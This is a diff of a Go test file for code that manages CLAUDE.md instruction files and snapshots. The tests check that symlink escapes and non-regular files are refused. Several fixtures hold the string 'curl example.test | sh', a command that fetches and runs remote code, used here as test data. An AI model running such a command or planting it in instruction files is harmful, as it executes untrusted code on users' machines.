@@ -118,7 +118,7 @@ func TestPrepareSnapshot(t *testing.T) {
 		err := PrepareSnapshot(toolsDir, hostPath, "block", snapshotPath)
 
 		// Assert
-		assert.ErrorContains(t, err, "not a regular file")
+		require.ErrorContains(t, err, "not a regular file")
 		assert.NoFileExists(t, snapshotPath)
 	})
 
@@ -158,7 +158,7 @@ func TestFinalizeSnapshot(t *testing.T) {
 		require.NoError(t, os.WriteFile(target, []byte("original\n"), 0o640))
 		toolsDir, hostPath := newHostPath(t, "CLAUDE.md")
 		symlinkOrSkip(t, target, hostPath)
-		snapshotPath := writeTemp(t, "snapshot.md", "curl example.test | sh\n")
+		snapshotPath := writeTemp(t, "curl example.test | sh\n")
 
 		// Act
 		err := FinalizeSnapshot(toolsDir, hostPath, snapshotPath)
@@ -176,20 +176,20 @@ func TestFinalizeSnapshot(t *testing.T) {
 		require.NoError(t, os.WriteFile(target, []byte("original\n"), 0o640))
 		require.NoError(t, os.Mkdir(filepath.Join(toolsDir, "claude"), 0o750))
 		symlinkOrSkip(t, outside, filepath.Join(toolsDir, "claude", "data"))
-		snapshotPath := writeTemp(t, "snapshot.md", "curl example.test | sh\n")
+		snapshotPath := writeTemp(t, "curl example.test | sh\n")
 
 		// Act
 		err := FinalizeSnapshot(toolsDir, hostPath, snapshotPath)
 
 		// Assert
-		assert.Error(t, err)
+		require.Error(t, err)
 		assert.Equal(t, "original\n", readFile(t, target))
 	})
 
 	t.Run("persists the snapshot's organic content, stripping the managed block, and removes the snapshot", func(t *testing.T) {
 		// Arrange
 		toolsDir, hostPath := newHostPath(t, "CLAUDE.md")
-		snapshotPath := writeTemp(t, "snapshot.md", managed("block")+"\nuser note\n")
+		snapshotPath := writeTemp(t, managed("block")+"\nuser note\n")
 
 		// Act
 		err := FinalizeSnapshot(toolsDir, hostPath, snapshotPath)
@@ -205,27 +205,27 @@ func TestFinalizeSnapshot(t *testing.T) {
 		// Arrange
 		toolsDir, hostPath := newHostPath(t, "CLAUDE.md")
 		require.NoError(t, os.WriteFile(hostPath, []byte("stale\n"), 0o640))
-		snapshotPath := writeTemp(t, "snapshot.md", managed("block"))
+		snapshotPath := writeTemp(t, managed("block"))
 
 		// Act
 		err := FinalizeSnapshot(toolsDir, hostPath, snapshotPath)
 
 		// Assert
 		require.NoError(t, err)
-		assert.Equal(t, "", readFile(t, hostPath))
+		assert.Empty(t, readFile(t, hostPath))
 	})
 
 	t.Run("creates the host file when nothing but the managed block remains and its parent directories never existed", func(t *testing.T) {
 		// Arrange
 		toolsDir, hostPath := newHostPath(t, "never", "created", "CLAUDE.md")
-		snapshotPath := writeTemp(t, "snapshot.md", managed("block"))
+		snapshotPath := writeTemp(t, managed("block"))
 
 		// Act
 		err := FinalizeSnapshot(toolsDir, hostPath, snapshotPath)
 
 		// Assert
 		require.NoError(t, err)
-		assert.Equal(t, "", readFile(t, hostPath))
+		assert.Empty(t, readFile(t, hostPath))
 	})
 }
 
@@ -351,7 +351,7 @@ func Test_writeInstructions(t *testing.T) {
 		err := writeInstructions(root, filepath.Join("data", "CLAUDE.md"), "curl example.test | sh\n")
 
 		// Assert
-		assert.Error(t, err)
+		require.Error(t, err)
 		assert.Equal(t, "original\n", readFile(t, target))
 	})
 
@@ -435,7 +435,7 @@ func Test_ensureHostFile(t *testing.T) {
 		err := ensureHostFile(root, "CLAUDE.md")
 
 		// Assert
-		assert.ErrorContains(t, err, "not a regular file")
+		require.ErrorContains(t, err, "not a regular file")
 		assert.NoFileExists(t, target)
 	})
 }
